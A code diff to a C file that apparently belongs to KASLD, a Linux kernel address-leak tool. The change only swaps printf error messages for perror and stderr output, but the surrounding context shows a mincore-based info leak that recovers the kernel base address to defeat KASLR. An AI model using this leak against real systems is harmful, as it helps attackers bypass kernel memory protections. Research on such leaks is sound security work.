@@ -15,6 +15,7 @@
 
 #define _GNU_SOURCE
 #include "kasld.h"
+#include <errno.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -31,7 +32,7 @@ unsigned long get_kernel_addr_mincore() {
   if (mmap((void *)0x66000000, len, PROT_NONE,
            MAP_SHARED | MAP_ANONYMOUS | MAP_HUGETLB | MAP_NORESERVE, -1,
            0) == MAP_FAILED) {
-    printf("[-] mmap(): %m\n");
+    perror("[-] mmap");
     return 0;
   }
 
@@ -39,7 +40,7 @@ unsigned long get_kernel_addr_mincore() {
   for (i = 0; i <= iterations; i++) {
     /* Touch a mishandle with this type mapping */
     if (mincore((void *)0x86000000, 0x1000000, buf)) {
-      printf("[-] mincore(): %m\n");
+      perror("[-] mincore");
       return 0;
     }
 
@@ -49,16 +50,16 @@ unsigned long get_kernel_addr_mincore() {
       /* Kernel address space */
       if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX) {
         if (munmap((void *)0x66000000, len))
-          printf("[-] munmap(): %m\n");
+          perror("[-] munmap");
         return addr;
       }
     }
   }
 
   if (munmap((void *)0x66000000, len))
-    printf("[-] munmap(): %m\n");
+    perror("[-] munmap");
 
-  printf("[-] kernel base not found in mincore info leak\n");
+  fprintf(stderr, "[-] kernel base not found in mincore info leak\n");
   return 0;
 }
 
